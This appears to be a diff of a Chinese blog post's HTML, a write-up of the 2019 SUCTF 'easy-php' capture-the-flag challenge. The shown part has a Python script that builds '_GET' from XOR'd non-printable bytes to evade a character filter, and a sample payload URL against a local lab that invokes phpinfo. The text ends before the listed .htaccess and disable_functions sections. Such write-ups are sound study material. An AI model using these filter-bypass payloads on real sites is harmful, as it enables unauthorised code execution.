@@ -1,352 +1,600 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="easy-phpPhp的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串 Ascii码大于 0x7F 的字符都会被当作字符串 可见字符1234567891011In [35]: string.printableOut[35]: &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTU">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2019SUCTF Easay-php题解记录">
-<meta property="og:url" content="http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/index.html">
-<meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="easy-phpPhp的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串 Ascii码大于 0x7F 的字符都会被当作字符串 可见字符1234567891011In [35]: string.printableOut[35]: &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTU">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/1566634092815.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/1566635928733.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/1566635895793.png">
-<meta property="article:published_time" content="2019-08-24T08:54:48.000Z">
-<meta property="article:modified_time" content="2020-05-15T08:25:52.000Z">
-<meta property="article:author" content="osword">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/1566634092815.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>2019SUCTF Easay-php题解记录</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>2019SUCTF Easay-php题解记录 - osword&#39;s blog</title>
 
-    <!-- persian styles -->
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
     
       
-<link rel="stylesheet" href="/css/rtl.css">
-
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.1"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/07/30/Thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&text=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&title=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&is_video=false&description=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=2019SUCTF Easay-php题解记录&body=Check out this article: http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&title=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&title=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&title=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&title=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&name=2019SUCTF Easay-php题解记录&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/&t=2019SUCTF Easay-php题解记录" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-php"><span class="toc-number">1.</span> <span class="toc-text">easy-php</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#可见字符"><span class="toc-number">1.1.</span> <span class="toc-text">可见字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传htaccess"><span class="toc-number">1.2.</span> <span class="toc-text">上传htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#disbale-functions过滤不全"><span class="toc-number">1.3.</span> <span class="toc-text">disbale_functions过滤不全</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">2.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        2019SUCTF Easay-php题解记录
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">osword's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-08-24T08:54:48.000Z" itemprop="datePublished">2019-08-24</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-    </div>
-
-
-      <span id="/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/" class="leancloud_visitors" data-flag-title="2019SUCTF Easay-php题解记录">
-    <em class="post-meta-item-text">阅读量 </em>
-    <i class="leancloud-visitors-count" data-index="/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/"></span>
-    </div>
-
-  </header>
   
 
-  <div class="content" itemprop="articleBody">
-    <h1 id="easy-php"><a href="#easy-php" class="headerlink" title="easy-php"></a>easy-php</h1><p>Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串</p>
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-08-24 16:54" pubdate>
+        2019年8月24日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      743 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">2019SUCTF Easay-php题解记录</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="easy-php"><a href="#easy-php" class="headerlink" title="easy-php"></a>easy-php</h1><p>Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串</p>
 <p>Ascii码大于 0x7F 的字符都会被当作字符串</p>
-<h2 id="可见字符"><a href="#可见字符" class="headerlink" title="可见字符"></a>可见字符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">35</span>]: string.printable</span><br><span class="line">Out[<span class="number">35</span>]: <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r\x0b\x0c'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">36</span>]: ee=string.printable</span><br><span class="line"></span><br><span class="line">In [<span class="number">37</span>]: a=map(<span class="keyword">lambda</span> x:x.encode(<span class="string">"hex"</span>),list(ee))</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: print(a)</span><br><span class="line">[<span class="string">'30'</span>, <span class="string">'31'</span>, <span class="string">'32'</span>, <span class="string">'33'</span>, <span class="string">'34'</span>, <span class="string">'35'</span>, <span class="string">'36'</span>, <span class="string">'37'</span>, <span class="string">'38'</span>, <span class="string">'39'</span>, <span class="string">'61'</span>, <span class="string">'62'</span>, <span class="string">'63'</span>, <span class="string">'64'</span>, <span class="string">'65'</span>, <span class="string">'66'</span>, <span class="string">'67'</span>, <span class="string">'68'</span>, <span class="string">'69'</span>, <span class="string">'6a'</span>, <span class="string">'6b'</span>, <span class="string">'6c'</span>, <span class="string">'6d'</span>, <span class="string">'6e'</span>, <span class="string">'6f'</span>, <span class="string">'70'</span>, <span class="string">'71'</span>, <span class="string">'72'</span>, <span class="string">'73'</span>, <span class="string">'74'</span>, <span class="string">'75'</span>, <span class="string">'76'</span>, <span class="string">'77'</span>, <span class="string">'78'</span>, <span class="string">'79'</span>, <span class="string">'7a'</span>, <span class="string">'41'</span>, <span class="string">'42'</span>, <span class="string">'43'</span>, <span class="string">'44'</span>, <span class="string">'45'</span>, <span class="string">'46'</span>, <span class="string">'47'</span>, <span class="string">'48'</span>, <span class="string">'49'</span>, <span class="string">'4a'</span>, <span class="string">'4b'</span>, <span class="string">'4c'</span>, <span class="string">'4d'</span>, <span class="string">'4e'</span>, <span class="string">'4f'</span>, <span class="string">'50'</span>, <span class="string">'51'</span>, <span class="string">'52'</span>, <span class="string">'53'</span>, <span class="string">'54'</span>, <span class="string">'55'</span>, <span class="string">'56'</span>, <span class="string">'57'</span>, <span class="string">'58'</span>, <span class="string">'59'</span>, <span class="string">'5a'</span>, <span class="string">'21'</span>, <span class="string">'22'</span>, <span class="string">'23'</span>, <span class="string">'24'</span>, <span class="string">'25'</span>, <span class="string">'26'</span>, <span class="string">'27'</span>, <span class="string">'28'</span>, <span class="string">'29'</span>, <span class="string">'2a'</span>, <span class="string">'2b'</span>, <span class="string">'2c'</span>, <span class="string">'2d'</span>, <span class="string">'2e'</span>, <span class="string">'2f'</span>, <span class="string">'3a'</span>, <span class="string">'3b'</span>, <span class="string">'3c'</span>, <span class="string">'3d'</span>, <span class="string">'3e'</span>, <span class="string">'3f'</span>, <span class="string">'40'</span>, <span class="string">'5b'</span>, <span class="string">'5c'</span>, <span class="string">'5d'</span>, <span class="string">'5e'</span>, <span class="string">'5f'</span>, <span class="string">'60'</span>, <span class="string">'7b'</span>, <span class="string">'7c'</span>, <span class="string">'7d'</span>, <span class="string">'7e'</span>, <span class="string">'20'</span>, <span class="string">'09'</span>, <span class="string">'0a'</span>, <span class="string">'0d'</span>, <span class="string">'0b'</span>, <span class="string">'0c'</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]:</span><br></pre></td></tr></table></figure>
+<h2 id="可见字符"><a href="#可见字符" class="headerlink" title="可见字符"></a>可见字符</h2><pre><code class="hljs python">In [<span class="hljs-number">35</span>]: string.printable
+Out[<span class="hljs-number">35</span>]: <span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r\x0b\x0c'</span>
+
+In [<span class="hljs-number">36</span>]: ee=string.printable
+
+In [<span class="hljs-number">37</span>]: a=map(<span class="hljs-keyword">lambda</span> x:x.encode(<span class="hljs-string">"hex"</span>),list(ee))
+
+In [<span class="hljs-number">38</span>]: print(a)
+[<span class="hljs-string">'30'</span>, <span class="hljs-string">'31'</span>, <span class="hljs-string">'32'</span>, <span class="hljs-string">'33'</span>, <span class="hljs-string">'34'</span>, <span class="hljs-string">'35'</span>, <span class="hljs-string">'36'</span>, <span class="hljs-string">'37'</span>, <span class="hljs-string">'38'</span>, <span class="hljs-string">'39'</span>, <span class="hljs-string">'61'</span>, <span class="hljs-string">'62'</span>, <span class="hljs-string">'63'</span>, <span class="hljs-string">'64'</span>, <span class="hljs-string">'65'</span>, <span class="hljs-string">'66'</span>, <span class="hljs-string">'67'</span>, <span class="hljs-string">'68'</span>, <span class="hljs-string">'69'</span>, <span class="hljs-string">'6a'</span>, <span class="hljs-string">'6b'</span>, <span class="hljs-string">'6c'</span>, <span class="hljs-string">'6d'</span>, <span class="hljs-string">'6e'</span>, <span class="hljs-string">'6f'</span>, <span class="hljs-string">'70'</span>, <span class="hljs-string">'71'</span>, <span class="hljs-string">'72'</span>, <span class="hljs-string">'73'</span>, <span class="hljs-string">'74'</span>, <span class="hljs-string">'75'</span>, <span class="hljs-string">'76'</span>, <span class="hljs-string">'77'</span>, <span class="hljs-string">'78'</span>, <span class="hljs-string">'79'</span>, <span class="hljs-string">'7a'</span>, <span class="hljs-string">'41'</span>, <span class="hljs-string">'42'</span>, <span class="hljs-string">'43'</span>, <span class="hljs-string">'44'</span>, <span class="hljs-string">'45'</span>, <span class="hljs-string">'46'</span>, <span class="hljs-string">'47'</span>, <span class="hljs-string">'48'</span>, <span class="hljs-string">'49'</span>, <span class="hljs-string">'4a'</span>, <span class="hljs-string">'4b'</span>, <span class="hljs-string">'4c'</span>, <span class="hljs-string">'4d'</span>, <span class="hljs-string">'4e'</span>, <span class="hljs-string">'4f'</span>, <span class="hljs-string">'50'</span>, <span class="hljs-string">'51'</span>, <span class="hljs-string">'52'</span>, <span class="hljs-string">'53'</span>, <span class="hljs-string">'54'</span>, <span class="hljs-string">'55'</span>, <span class="hljs-string">'56'</span>, <span class="hljs-string">'57'</span>, <span class="hljs-string">'58'</span>, <span class="hljs-string">'59'</span>, <span class="hljs-string">'5a'</span>, <span class="hljs-string">'21'</span>, <span class="hljs-string">'22'</span>, <span class="hljs-string">'23'</span>, <span class="hljs-string">'24'</span>, <span class="hljs-string">'25'</span>, <span class="hljs-string">'26'</span>, <span class="hljs-string">'27'</span>, <span class="hljs-string">'28'</span>, <span class="hljs-string">'29'</span>, <span class="hljs-string">'2a'</span>, <span class="hljs-string">'2b'</span>, <span class="hljs-string">'2c'</span>, <span class="hljs-string">'2d'</span>, <span class="hljs-string">'2e'</span>, <span class="hljs-string">'2f'</span>, <span class="hljs-string">'3a'</span>, <span class="hljs-string">'3b'</span>, <span class="hljs-string">'3c'</span>, <span class="hljs-string">'3d'</span>, <span class="hljs-string">'3e'</span>, <span class="hljs-string">'3f'</span>, <span class="hljs-string">'40'</span>, <span class="hljs-string">'5b'</span>, <span class="hljs-string">'5c'</span>, <span class="hljs-string">'5d'</span>, <span class="hljs-string">'5e'</span>, <span class="hljs-string">'5f'</span>, <span class="hljs-string">'60'</span>, <span class="hljs-string">'7b'</span>, <span class="hljs-string">'7c'</span>, <span class="hljs-string">'7d'</span>, <span class="hljs-string">'7e'</span>, <span class="hljs-string">'20'</span>, <span class="hljs-string">'09'</span>, <span class="hljs-string">'0a'</span>, <span class="hljs-string">'0d'</span>, <span class="hljs-string">'0b'</span>, <span class="hljs-string">'0c'</span>]
+
+In [<span class="hljs-number">39</span>]:</code></pre>
 
 <p>使用不可打印字符来进行异或，生成<code>_GET</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">pstr=string.printable</span><br><span class="line">hexstr=map(<span class="keyword">lambda</span> x:x.encode(<span class="string">'hex'</span>),list(pstr))</span><br><span class="line">temphex=<span class="keyword">lambda</span> x:str(hex(x))</span><br><span class="line">print(list(pstr))</span><br><span class="line"></span><br><span class="line">_=[]</span><br><span class="line">G=[]</span><br><span class="line">E=[]</span><br><span class="line">T=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(i) <span class="keyword">not</span> <span class="keyword">in</span> list(pstr)) &amp; (chr(j) <span class="keyword">not</span> <span class="keyword">in</span> list(pstr)):</span><br><span class="line">            tmp=i^j</span><br><span class="line">            <span class="keyword">if</span> chr(tmp)==<span class="string">"_"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(temphex(j)[<span class="number">2</span>:]+<span class="string">"^"</span>+temphex(i)[<span class="number">2</span>:])</span><br><span class="line">                _.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tmp)==<span class="string">"G"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(temphex(j)[<span class="number">2</span>:]+<span class="string">"^"</span>+temphex(i)[<span class="number">2</span>:])</span><br><span class="line">                G.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tmp)==<span class="string">"E"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(temphex(j)[<span class="number">2</span>:]+<span class="string">"^"</span>+temphex(i)[<span class="number">2</span>:])</span><br><span class="line">                E.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tmp)==<span class="string">"T"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(temphex(j)[<span class="number">2</span>:]+<span class="string">"^"</span>+temphex(i)[<span class="number">2</span>:])</span><br><span class="line">                T.append(temp)</span><br><span class="line"></span><br><span class="line">print(_)</span><br><span class="line">print(G)</span><br><span class="line">print(E)</span><br><span class="line">print(T)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> string
+pstr=string.printable
+hexstr=map(<span class="hljs-keyword">lambda</span> x:x.encode(<span class="hljs-string">'hex'</span>),list(pstr))
+temphex=<span class="hljs-keyword">lambda</span> x:str(hex(x))
+print(list(pstr))
+
+_=[]
+G=[]
+E=[]
+T=[]
+
+<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
+        <span class="hljs-keyword">if</span> (chr(i) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> list(pstr)) &amp; (chr(j) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> list(pstr)):
+            tmp=i^j
+            <span class="hljs-keyword">if</span> chr(tmp)==<span class="hljs-string">"_"</span>:
+                temp=[]
+                temp.append(temphex(j)[<span class="hljs-number">2</span>:]+<span class="hljs-string">"^"</span>+temphex(i)[<span class="hljs-number">2</span>:])
+                _.append(temp)
+            <span class="hljs-keyword">if</span> chr(tmp)==<span class="hljs-string">"G"</span>:
+                temp=[]
+                temp.append(temphex(j)[<span class="hljs-number">2</span>:]+<span class="hljs-string">"^"</span>+temphex(i)[<span class="hljs-number">2</span>:])
+                G.append(temp)
+            <span class="hljs-keyword">if</span> chr(tmp)==<span class="hljs-string">"E"</span>:
+                temp=[]
+                temp.append(temphex(j)[<span class="hljs-number">2</span>:]+<span class="hljs-string">"^"</span>+temphex(i)[<span class="hljs-number">2</span>:])
+                E.append(temp)
+            <span class="hljs-keyword">if</span> chr(tmp)==<span class="hljs-string">"T"</span>:
+                temp=[]
+                temp.append(temphex(j)[<span class="hljs-number">2</span>:]+<span class="hljs-string">"^"</span>+temphex(i)[<span class="hljs-number">2</span>:])
+                T.append(temp)
+
+print(_)
+print(G)
+print(E)
+print(T)</code></pre>
 
 <p>随便拿个payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8877&#x2F;?_&#x3D;$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%df&#125;();&amp;%df&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
